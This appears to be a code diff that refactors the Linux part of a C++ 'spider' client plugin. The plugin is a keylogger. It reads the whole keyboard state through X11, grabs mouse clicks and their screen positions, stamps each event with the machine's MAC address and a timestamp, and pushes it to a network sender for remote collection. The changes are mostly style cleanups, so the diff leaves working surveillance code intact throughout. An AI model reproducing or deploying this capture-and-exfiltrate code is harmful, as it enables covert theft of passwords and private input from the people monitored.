@@ -139,25 +139,32 @@ namespace spider
           // {VK_OEM_7, KeyboardKey::KB_SIMPLEQUOTE}   // " if shift
       };
 
-      Display *_Xdisplay = NULL;
+      Display *_Xdisplay = nullptr;
       Window   _Xroot_win = 0;
 
       bool SpiderPlugin::initLinux()
       {
 	// Get informations
-        getInfosLinux();
-        // Mac Addr
-        MacAddress::get(m_macAddr);
-        
+	getInfosLinux();
+	// Mac Addr
+	MacAddress::get(m_macAddr);
+
 	// Init Window and Screen
-	if (!(_Xdisplay = XOpenDisplay(NULL)))
-	  return false;
+	_Xdisplay = XOpenDisplay(nullptr);
+	if (!_Xdisplay)
+	  {
+	    return false;
+	  }
 	Screen *screen = XScreenOfDisplay(_Xdisplay, DefaultScreen(_Xdisplay));
 	if (!screen)
-	  return false;
+	  {
+	    return false;
+	  }
 	_Xroot_win = RootWindow(_Xdisplay, XScreenNumberOfScreen(screen));
 	if (!_Xroot_win)
-          return false;
+	  {
+	    return false;
+	  }
 	return true;
       }
 
@@ -239,121 +246,126 @@ namespace spider
       bool SpiderPlugin::unHookMouseLinux() const
       {
 	XUngrabButton(_Xdisplay, Button1, AnyModifier, _Xroot_win);
-        XUngrabButton(_Xdisplay, Button3, AnyModifier, _Xroot_win);
+	XUngrabButton(_Xdisplay, Button3, AnyModifier, _Xroot_win);
 	return false;
       }
 
       void SpiderPlugin::runLinux() const
       {
-        // Keyboard
-        if (this->m_keyboardHook) {
+	// Keyboard
+	if (m_keyboardHook)
+	  {
 
-                spider::client::SystemMsg msg;
-                
-                static char szKey[32];
-                static char szKeyOld[32] = { 0 };
-        
-                static char szBit = 0;
-                static char szBitOld = 0;
-                static int  iCheck = 0;
-        
-                static char  szKeysym = 0;
-                static char *szKeyString = NULL;
-        
-                int iKeyCode = 0;
-                int iReverToReturn = 0;
+	    spider::client::SystemMsg msg;
 
-                XQueryKeymap(_Xdisplay, szKey);
-                if (memcmp(szKey, szKeyOld, 32))
-                {
-                        for (size_t i = 0; i < sizeof(szKey); i++)
-                        {
-                                szBit = szKey[i];
-                                szBitOld = szKeyOld[i];
-                                iCheck = 1;
+	    static std::array<char, 32>            szKey{};
+	    static std::array<char, sizeof(szKey)> szKeyOld{};
 
-                                for (int j = 0; j < 8; j++)
-                                {
-                                if ((szBit & iCheck) && !(szBitOld & iCheck))
-                                {
-                                        iKeyCode = i * 8 + j;
+	    static char szBit = 0;
+	    static char szBitOld = 0;
+	    static int  iCheck = 0;
 
-                                        msg.sys.type = SystemMsgType::EventKeyboard;
-                                        msg.sys.time =
-                                        static_cast<std::uint64_t>(std::time(nullptr));
-                                        std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
-                                        msg.sys.event.state = SystemMsgEventState::Down;
+	    static char  szKeysym = 0;
+	    static char *szKeyString = nullptr;
 
-                                        if (m_linuxKeyboardMap.find(iKeyCode) ==
-                                        m_linuxKeyboardMap.end())
-                                        {
-                                        msg.sys.event.key = static_cast<std::uint32_t>(
-                                                KeyboardKey::KB_NONE);
-                                        }
-                                        else
-                                        {
-                                        msg.sys.event.key = static_cast<std::uint32_t>(
-                                                m_linuxKeyboardMap[iKeyCode]);
-                                        }
-                                        msg.sys.event.upper = false;
-                                        SpiderPlugin::m_sendToNetwork->push(msg);
+	    int iKeyCode = 0;
+	    int iReverToReturn = 0;
 
-                                        XGetInputFocus(_Xdisplay, &_Xroot_win,
-                                                &iReverToReturn);
-                                }
-                                iCheck <<= 1;
-                                }
-                        }
-                }
-                memcpy(szKeyOld, szKey, 32);
-        }
+	    XQueryKeymap(_Xdisplay, szKey.data());
+	    if (std::memcmp(szKey.data(), szKeyOld.data(), sizeof(szKey)))
+	      {
+		for (size_t i = 0; i < sizeof(szKey); i++)
+		  {
+		    szBit = szKey[i];
+		    szBitOld = szKeyOld[i];
+		    iCheck = 1;
 
-        // Mouse
-        if (this->m_mouseHook) {
-                while (XPending(_Xdisplay) > 0)
-                        {
-                        spider::client::SystemMsg msg;
-                        XEvent report;
-                                
-                        XNextEvent(_Xdisplay, &report);
-                        XAllowEvents(_Xdisplay, ReplayPointer, CurrentTime);
+		    for (int j = 0; j < 8; j++)
+		      {
+			if ((szBit & iCheck) && !(szBitOld & iCheck))
+			  {
+			    iKeyCode = i * 8 + j;
 
-                        if (report.type == ButtonPress)
-                        {
-                        bool getPos = false;
+			    msg.sys.type = SystemMsgType::EventKeyboard;
+			    msg.sys.time =
+			        static_cast<std::uint64_t>(std::time(nullptr));
+			    std::copy(m_macAddr.begin(), m_macAddr.end(),
+			              msg.sys.mac.data());
+			    msg.sys.event.state = SystemMsgEventState::Down;
 
-                        msg.sys.type = SystemMsgType::EventMouse;
-                        msg.sys.time = static_cast<std::uint64_t>(std::time(nullptr));
-                        std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
-                        msg.sys.event.upper = 0;
+			    if (m_linuxKeyboardMap.find(iKeyCode) ==
+			        m_linuxKeyboardMap.end())
+			      {
+				msg.sys.event.key = static_cast<std::uint32_t>(
+				    KeyboardKey::KB_NONE);
+			      }
+			    else
+			      {
+				msg.sys.event.key = static_cast<std::uint32_t>(
+				    m_linuxKeyboardMap[iKeyCode]);
+			      }
+			    msg.sys.event.upper = false;
+			    SpiderPlugin::m_sendToNetwork->push(msg);
 
-                        switch (report.xbutton.button)
-                                {
-                                case 1: // LEFT CLICK
-                                getPos = true;
-                                msg.sys.event.key =
-                                static_cast<std::uint32_t>(MouseButton::ButtonLeft);
-                                msg.sys.event.state = SystemMsgEventState::Down;
-                                break;
-                                case 3: // RIGHT CLICK
-                                getPos = true;
-                                msg.sys.event.key =
-                                static_cast<std::uint32_t>(MouseButton::ButtonRight);
-                                msg.sys.event.state = SystemMsgEventState::Up;
-                                break;
-                                }
-                        if (getPos)
-                                {
-                                msg.sys.event.posX =
-                                static_cast<std::uint32_t>(report.xbutton.x);
-                                msg.sys.event.posY =
-                                static_cast<std::uint32_t>(report.xbutton.y);
-                                }
-                        SpiderPlugin::m_sendToNetwork->push(msg);
-                        }
-                }
-        }
-}
+			    XGetInputFocus(_Xdisplay, &_Xroot_win,
+			                   &iReverToReturn);
+			  }
+			iCheck <<= 1;
+		      }
+		  }
+	      }
+	    std::memcpy(szKeyOld.data(), szKey.data(), sizeof(szKey));
+	  }
+
+	// Mouse
+	if (m_mouseHook)
+	  {
+	    while (XPending(_Xdisplay) > 0)
+	      {
+		spider::client::SystemMsg msg;
+		XEvent                    report;
+
+		XNextEvent(_Xdisplay, &report);
+		XAllowEvents(_Xdisplay, ReplayPointer, CurrentTime);
+
+		if (report.type == ButtonPress)
+		  {
+		    bool getPos = false;
+
+		    msg.sys.type = SystemMsgType::EventMouse;
+		    msg.sys.time =
+		        static_cast<std::uint64_t>(std::time(nullptr));
+		    std::copy(m_macAddr.begin(), m_macAddr.end(),
+		              msg.sys.mac.data());
+		    msg.sys.event.upper = 0;
+
+		    switch (report.xbutton.button)
+		      {
+		      case 1: // LEFT CLICK
+			getPos = true;
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    MouseButton::ButtonLeft);
+			msg.sys.event.state = SystemMsgEventState::Down;
+			break;
+		      case 3: // RIGHT CLICK
+			getPos = true;
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    MouseButton::ButtonRight);
+			msg.sys.event.state = SystemMsgEventState::Up;
+			break;
+		      }
+		    if (getPos)
+		      {
+			msg.sys.event.posX =
+			    static_cast<std::uint32_t>(report.xbutton.x);
+			msg.sys.event.posY =
+			    static_cast<std::uint32_t>(report.xbutton.y);
+		      }
+		    SpiderPlugin::m_sendToNetwork->push(msg);
+		  }
+	      }
+	  }
+      }
     }
   }
 }
